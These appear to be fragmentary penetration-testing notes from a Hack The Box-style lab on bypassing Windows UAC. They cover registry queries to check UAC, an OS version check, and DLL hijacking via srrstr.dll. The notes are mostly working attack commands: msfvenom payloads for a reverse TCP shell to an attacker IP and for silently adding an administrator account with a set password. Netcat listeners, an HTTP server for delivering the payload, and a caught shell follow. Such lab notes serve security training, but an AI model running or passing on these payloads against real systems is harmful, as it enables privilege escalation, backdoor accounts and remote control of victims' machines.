...
UAC is a feature that enables a consent prompt for elevated activities, different applications can have different integrities and when UAC is enabled applications and tasks run under the security context of a non-administrator account unless an administrator explicity authorizes these applications/tasks to have administrator-level access to the system to run.




```powershell
// Confirming if UAC is on, if the result is 0x1 then it is on
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

// Checking the UAC Level here, the value from ConsentPromptBehaviorAdmin is the level of protection, 5 being the highest.
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

// Checking the windows version
[environment]::OSVersion.Version

// -------------------- Based on the version you could find UAC bypasses for it, 14393 is our version in this case for example -------------------- //
...
// then the rest is simply, generate a DLL and place it in that path
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.176 LPORT=8443 -f dll > srrstr.dll  // safer, this works
// this one doesnt work idk why
msfvenom -p windows/x64/exec cmd='net user sawyer password123! /add && net localgroup "administrators" sawyer /add' -f dll -o srrstr.dll


//-------------------- And we get our shell -------------------- //
kali@kali ~> nc -nvlp 8443
listening on [any] 8443 ...
connect to [10.10.15.176] from (UNKNOWN) [10.129.182.159] 49676
...
```shell-session
Hillside_1@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
...
```shell-session
Hillside_1@htb[/htb]$ sudo python3 -m http.server 8080
```
...
```shell-session
Hillside_1@htb[/htb]$ nc -lvnp 8443
```
...
```shell-session
Hillside_1@htb[/htb]$ nc -lnvp 8443
